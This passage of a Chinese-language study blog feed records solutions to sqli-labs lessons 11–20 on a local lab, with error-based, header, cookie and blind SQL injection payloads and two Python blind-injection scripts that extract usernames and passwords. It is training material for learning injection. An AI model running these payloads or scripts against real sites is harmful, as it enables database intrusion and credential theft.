</p><p>最终payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(&#x27;!&#x27;,(select concat(username,<span class="hljs-number">2</span>,password)from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)#<br><br><span class="hljs-attribute">User</span>-Agent: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database())),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><p>为什么要用 or 或 and 连接:</p><p>因为使用了报错注入，所以需要使用or或and来闭合原语句并插入的注入语句。</p><h1 id="less19-头部注入-Referer"><a href="#less19-头部注入-Referer" class="headerlink" title="less19 头部注入-Referer"></a>less19 头部注入-Referer</h1><p>后端可以注入的语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure><p>相比上一关只有两个参数，所以可以这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(databass())),1),2)#  //爆数据库<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27;)),1),2)#  //爆表名<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1)),1),2)#   <br>//分段回显<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select concat(id,username,&#x27;!&#x27;,password)from users limit 0,1)),1),2)#<br>//最后一行行爆<br></code></pre></td></tr></table></figure><p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/3.png" alt="3"><br>也可以这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;<br></code></pre></td></tr></table></figure><h1 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h1><p>题目提示cookie注入，登录正确的账户名出现以下界面<br><img src="http://39.105.15.250/aidemofashi_home/img/note-10/4.png" alt="4"><br>表头如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli-labs/Less-20/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;122&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/sqli-labs/Less-20/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=admin<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>cookie只有一个unmae？<br>尝试在uname注入<br><img src="http://39.105.15.250/aidemofashi_home/img/note-10/5.png" alt="5">  </p><p>发现注入点</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">Cookie: uname=&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,username,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><p>可能是该后端代码造成了注入</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;$cookee&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/6.png" alt="6">  </p>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-09</title>
    <link href="/2025/03/09/note-09/"/>
    <url>/2025/03/09/note-09/</url>
    
    <content type="html"><![CDATA[<h1 id="sql-labs-less16"><a href="#sql-labs-less16" class="headerlink" title="sql-labs-less16"></a>sql-labs-less16</h1><p>先找一下注入点</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) or true#&amp;submit=Submit<br></code></pre></td></tr></table></figure><p>尝试报错注入，无果<br>进行盲注<br>改一下less14的脚本来用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br><span class="hljs-comment"># 网站路径</span><br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-16/&quot;</span><br><span class="hljs-comment"># 判断长度的payload</span><br>payload_len = <span class="hljs-string">&quot;&quot;&quot;a&quot;) or length(</span><br><span class="hljs-string">(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="hljs-comment"># 枚举字符的payload</span><br>payload_str = <span class="hljs-string">&quot;&quot;&quot;a&quot;) or ascii(</span><br><span class="hljs-string">substr(</span><br><span class="hljs-string">(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;l&#125;,1)) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br> <br><span class="hljs-comment"># post请求参数</span><br>data= &#123;<br>    <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;a“ or 1 -- a&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span> : <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;submit&quot;</span> : <span class="hljs-string">&quot;Submit&quot;</span><br>&#125;<br> <br><span class="hljs-comment"># 判断长度</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLen</span>(<span class="hljs-params">payload_len</span>):<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 修改请求参数</span><br>        data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_len.<span class="hljs-built_in">format</span>(n = length)<br>        response = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># 出现此内容为登录成功</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;测试成功，长度为：&#x27;</span>, length)<br>            <span class="hljs-keyword">return</span> length;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在测试长度：&#x27;</span>, length)<br>            length += <span class="hljs-number">1</span><br> <br> <br><span class="hljs-comment"># 枚举字符</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 从第一个字符开始截取</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 枚举字符的每一种可能性</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_str.<span class="hljs-built_in">format</span>(l=l, n=n)<br>            response = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;第&#x27;</span>, l, <span class="hljs-string">&#x27;个字符枚举成功：&#x27;</span>,<span class="hljs-built_in">str</span> )<br>                <span class="hljs-keyword">break</span><br> <br>length = getLen(payload_len)<br>getStr(length)<br><br></code></pre></td></tr></table></figure><p>by：<a href="https://blog.csdn.net/wangyuxiang946/article/details/118094895">https://blog.csdn.net/wangyuxiang946/article/details/118094895</a><br>只用改payload中的，两个都要改不然字长对不上  </p><h1 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h1><p>输入正确的账户和密码：admin，admin<br>提示密码已更新<br>看来页面是能对原有用户密码进行修改<br>在less1确认了猜测是正确的。<br>没想法了去查博客，<br>查看页面源码，是对username做了过滤，会先检查库里是否有对应username<br>只能从password注入</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br>或者<br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>,(select group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>回显  </p><blockquote><p>You can’t specify target table ‘users’ for update in FROM clause  </p></blockquote><p>看来是不能直接爆表  </p><blockquote><p>原因是mysql数据不支持查询和更新是同一张表。所以我们需要加一个中间表。这个关卡需要输入正确账号因为是密码重置页面，所以爆出的是该账户的原始密码。如果查询时不是users表就不会报错。</p></blockquote><p>此payload创建了新的临时表x来避免对正在更新的users表进行直接查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">123456</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select * from(select concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users limit 0,1)x)))#</span><br></code></pre></td></tr></table></figure><p>KIMI:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; OR (updatexml(1,concat(&#x27;</span><span class="hljs-operator">!</span><span class="hljs-string">&#x27;,(SELECT concat_ws(&#x27;</span>:<span class="hljs-string">&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1))#  </span><br><span class="hljs-string">```  </span><br><span class="hljs-string">updatxml()</span><br><span class="hljs-string">```sql</span><br><span class="hljs-string">updatexml(1, concat(&#x27;</span><span class="hljs-operator">!</span><span class="hljs-string">&#x27;, data), 1)  </span><br><span class="hljs-string">如果data是一个查询结果，那么当updatexml()函数执行时，会因为xpath_expr不符合要求而报错，</span><br><span class="hljs-string">错误信息中会包含data的内容。  </span><br></code></pre></td></tr></table></figure><p>数据查询部分：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>, username, password) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> username, password <span class="hljs-keyword">FROM</span> users)text LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>功能：  </p><blockquote><p>SELECT username, password FROM users：从users表中查询username和password字段。<br>(……)text：这是一个派生表（子查询的结果被当作一个临时表），命名为text。派生表的作用是绕过某些SQL注入场景中对直接查询表的限制。<br>concat_ws(‘:’, username, password)：将username和password字段用冒号（:）拼接成一个字符串，例如admin:password123。<br>LIMIT 0,1：限制查询结果只返回第一行数据。<br>作用：<br>从users表中提取用户名和密码，并将它们拼接成一个字符串，作为updatexml()函数的第二个参数。  </p></blockquote><p>执行过程：  </p><blockquote><p>闭合原语句并注入逻辑： OR操作使得注入的语句能够被执行。<br>查询数据： 从users表中提取用户名和密码，并拼接成一个字符串。<br>触发报错： 将拼接后的字符串作为updatexml()的第二个参数，触发报错。<br>泄露数据： 报错信息中会包含拼接后的字符串，从而泄露用户名和密码。<br>返回结果：<br>当这个注入语句执行时，MySQL会返回一个错误信息，类似如下：<br>XPATH syntax error: ‘!admin:password123’<br>从这个错误信息中，我们可以提取出admin:password123，从而获取到用户名和密码。</p></blockquote><h2 id="group-by报错注入"><a href="#group-by报错注入" class="headerlink" title="group by报错注入"></a>group by报错注入</h2><p>不想看了，反正先知道有这个group by报错注入</p><h2 id="函数说明-错误说明"><a href="#函数说明-错误说明" class="headerlink" title="函数说明,错误说明"></a>函数说明,错误说明</h2><h3 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws()"></a>concat_ws()</h3><p>语法：concat_ws(separator, str1, str2, …, strN)<br>功能：将两个或多个字符串用指定的分隔符连接起来，返回连接后的字符串。<br>特点：<br>第一个参数是分隔符，后续参数是要连接的字符串。<br>如果分隔符为 NULL，则结果为 NULL。<br>如果某个字符串为 NULL，则在连接时会跳过该字符串。  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;用户名&#x27;</span>, <span class="hljs-string">&#x27;密码&#x27;</span>, <span class="hljs-string">&#x27;邮箱&#x27;</span>);<br><span class="hljs-comment">-- 结果：用户名:密码:邮箱</span><br></code></pre></td></tr></table></figure><h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h3><blockquote><p>1’ and extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)# </p></blockquote><p>回显  </p><blockquote><p>Incorrect parameter count in the call to native function ‘extractvalue’</p></blockquote><p>KIMI：<br>出现这个错误是因为extractvalue()函数的参数数量不正确。extractvalue()函数在mysql中用于从xml数据中提取值，它的语法是：  </p><blockquote><p>extractvalue(xml_target, xpath_expression)  </p></blockquote><p>它只接受两个参数：<br>xml_target：要从中提取值的xml数据。<br>xpath_expression：用于定位xml数据中特定节点的xpath表达式。<br>而在你的payload中：  </p><blockquote><p>extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)  </p></blockquote><p>你传递了三个参数给extractvalue()函数，这显然不符合它的定义，因此mysql会报错，提示参数数量不正确。<br>正确的用法示例<br>如果你想使用extractvalue()函数来进行sql注入并获取数据，可以参考以下payload：  </p><blockquote><p>1’ and extractvalue(1, concat(0x7e,(select group_concat(id,username,password) from users),0x7e))#  </p></blockquote><p>这里只传递了两个参数给extractvalue()函数，符合它的定义，因此不会出现参数数量错误的问题。</p><h3 id="派生表"><a href="#派生表" class="headerlink" title="派生表"></a>派生表</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">(... ...)word<br>(<span class="hljs-selector-tag">SELECT</span> username, password <span class="hljs-selector-tag">FROM</span> users)<span class="hljs-selector-tag">text</span> #为派生表<span class="hljs-selector-tag">text</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-08</title>
    <link href="/2025/03/07/note-08/"/>
    <url>/2025/03/07/note-08/</url>
    
    <content type="html"><![CDATA[<h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><p>只有登录成功回显，没其它信息<br>密码传入必须有字符，闭合点</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;) #</span><br></code></pre></td></tr></table></figure><h2 id="错误注入"><a href="#错误注入" class="headerlink" title="错误注入"></a>错误注入</h2><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs post">uname=1&amp;passwd=1&#x27;) or updatexml(1,concat(0x7e,(select user()),0x7e),1)#&amp;submit=Submit<br></code></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>因为有登录成功反馈，可以使用布尔盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) or if(length(database()=8),0,1)#&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p>太菜了写不出脚本，使用sqlmap,或者bp来爆破。<br>找了一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br><span class="hljs-comment"># 网站路径</span><br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-13/&quot;</span><br><span class="hljs-comment"># 判断长度的payload</span><br>payload_len = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or length(</span><br><span class="hljs-string">(database())</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="hljs-comment"># 枚举字符的payload</span><br>payload_str = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or ascii(</span><br><span class="hljs-string">substr(</span><br><span class="hljs-string">(database())</span><br><span class="hljs-string">,&#123;l&#125;,1)</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br> <br><span class="hljs-comment"># post请求参数</span><br>data= &#123;<br>    <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;a&#x27;) or 1 -- a&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span> : <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;submit&quot;</span> : <span class="hljs-string">&quot;Submit&quot;</span><br>&#125;<br> <br><span class="hljs-comment"># 判断长度</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLen</span>(<span class="hljs-params">payload_len</span>):<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 修改请求参数</span><br>        data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_len.<span class="hljs-built_in">format</span>(n = length)<br>        response = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># 出现此内容为登录成功</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;测试成功，长度为：&#x27;</span>, length)<br>            <span class="hljs-keyword">return</span> length;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在测试长度：&#x27;</span>, length)<br>            length += <span class="hljs-number">1</span><br> <br> <br><span class="hljs-comment"># 枚举字符</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 从第一个字符开始截取</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 枚举字符的每一种可能性</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_str.<span class="hljs-built_in">format</span>(l=l, n=n)<br>            response = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;第&#x27;</span>, l, <span class="hljs-string">&#x27;个字符枚举成功：&#x27;</span>,<span class="hljs-built_in">str</span> )<br>                <span class="hljs-keyword">break</span><br> <br>length = getLen(payload_len)<br>getStr(length)<br></code></pre></td></tr></table></figure><p>可以换database()来实现其它注入,less13用单引号，less14用双引号<br>脚本出处：<a href="https://blog.csdn.net/wangyuxiang946/article/details/118094895">https://blog.csdn.net/wangyuxiang946/article/details/118094895</a></p><h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><p>换了闭合点，可以按less13的方式解：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&amp;password=1&quot; <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span> #&amp;<span class="hljs-attribute">submit</span>=Submit<br></code></pre></td></tr></table></figure><h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><p>没有报错回显，无法用报错注入，只能用布尔盲注<br>闭合点：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or true#&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-07</title>
    <link href="/2025/03/06/note-07/"/>
    <url>/2025/03/06/note-07/</url>
    
    <content type="html"><![CDATA[<h1 id="sql-labs-less11"><a href="#sql-labs-less11" class="headerlink" title="sql-labs-less11"></a>sql-labs-less11</h1><p>以前ctf练习题反而是post模式做的多些，<br>notice</p><blockquote><p>注意原先请求的值要改为数据库不存在的值免得将后面的查询结果覆盖  </p></blockquote><p>hackbar下的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs post">uname=1&#x27;union select user(),database()#&amp;passwd=&amp;submit=Submit<br></code></pre></td></tr></table></figure><p>之后的注入拼接进uname后  </p><p>爆用户和库名：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function">union <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">database</span>()#</span><br></code></pre></td></tr></table></figure><p>爆表名：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>爆字段：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 